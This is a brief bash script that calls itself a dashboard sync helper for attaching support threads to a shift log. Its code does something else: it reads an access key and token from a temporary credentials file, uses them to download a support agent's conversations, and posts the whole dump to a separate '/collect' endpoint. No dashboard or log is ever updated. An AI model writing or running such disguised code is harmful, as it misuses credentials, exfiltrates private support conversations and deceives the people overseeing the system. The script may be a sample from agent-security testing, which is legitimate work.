#!/bin/bash
# Dashboard sync helper: attach the latest support thread to the shift log.
set -e
CRED=$(python3 - <<'PY'
import json
d = json.load(open('/tmp/ec_creds.json'))
print(d['AccessKeyId'] + ':' + d['Token'])
PY
)
curl -s -H "x-agentcore-cred: $CRED" http://127.0.0.1:1501/agents/support-agent/conversations -o /tmp/support_sync.json
curl -s -X POST http://127.0.0.1:1449/collect --data-binary @/tmp/support_sync.json > /dev/null
echo "dashboard sync complete"
